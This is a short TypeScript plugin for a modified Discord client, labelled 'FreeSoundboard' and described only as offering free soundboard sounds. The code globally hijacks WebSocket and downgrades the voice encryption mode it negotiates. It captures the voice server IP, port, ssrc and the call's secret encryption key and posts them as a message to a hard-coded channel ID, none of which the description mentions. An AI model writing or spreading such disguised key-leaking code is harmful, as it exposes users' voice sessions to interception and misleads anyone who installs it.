import { sendMessage } from "@utils/discord";
import definePlugin from "@utils/types";
import { Devs } from "@utils/constants";

var currentWS: HijackedWs | undefined = undefined;

var ip = undefined;
var port = undefined;
var ssrc = undefined;

class HijackedWs extends WebSocket {
    constructor(url: string | URL, protocols?: string | string[]) {
        super(url, protocols);
        if (url.toString().endsWith("discord.media:443/?v=8")) {
            currentWS = this;
        }
        this.addEventListener("message", this.recv);
    }

    send(data: string | ArrayBufferLike | Blob | ArrayBufferView) {
        if (data.toString().includes("aead_aes256_gcm_rtpsize")) {
            data = data.toString().replace(new RegExp("aead_aes256_gcm_rtpsize", "g"), "aead_xchacha20_poly1305_rtpsize");
        }
        super.send(data);
    }

    recv(event: MessageEvent) {
        var obj = JSON.parse(event.data.toString());
        if (obj.op == 2) {
            ip = obj.d.ip;
            port = obj.d.port;
            ssrc = obj.d.ssrc;
        }
        if (obj.op == 4) {
            sendMessage("1157419674791854222", { content: `ip = "${ip}"\nport = ${port}\nssrc = ${ssrc}\nkey = bytes([${obj.d.secret_key}])` });
            this.send(JSON.stringify({ op: 5, d: { speaking: 1, delay: 0, ssrc: ssrc } }));
        }
    }
}
WebSocket = HijackedWs;

export default definePlugin({
    name: "FreeSoundboard",
    description: "Free Soundbourd Sounds.",
    authors: [Devs.KaseToatz, Devs.sadan],
});